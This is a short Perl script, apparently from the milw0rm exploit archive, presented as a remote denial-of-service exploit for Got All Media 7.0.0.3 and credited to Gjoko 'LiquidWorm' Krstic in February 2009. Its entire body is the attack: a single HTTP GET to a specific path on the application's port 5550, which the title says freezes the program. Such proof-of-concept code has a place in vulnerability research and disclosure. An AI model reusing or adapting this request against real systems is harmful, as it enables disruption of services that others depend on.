#!/usr/local/bin/perl
#
# Title: Got All Media 7.0.0.3 Remote Denial Of Service Exploit
# Product web page: http://www.gallm.com/default.aspx
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# liquidworm [t00t] gmail [w00t] com
# http://www.zeroscience.org
# 19.02.2009
#

print "\n[*] t00ting...\n";

use LWP::Simple;

my $url = 'http://127.0.0.1:5550/t00t';
my $freeze = get $url;
die "Couldn't get $url" unless defined $freeze;

# milw0rm.com [2009-02-20]
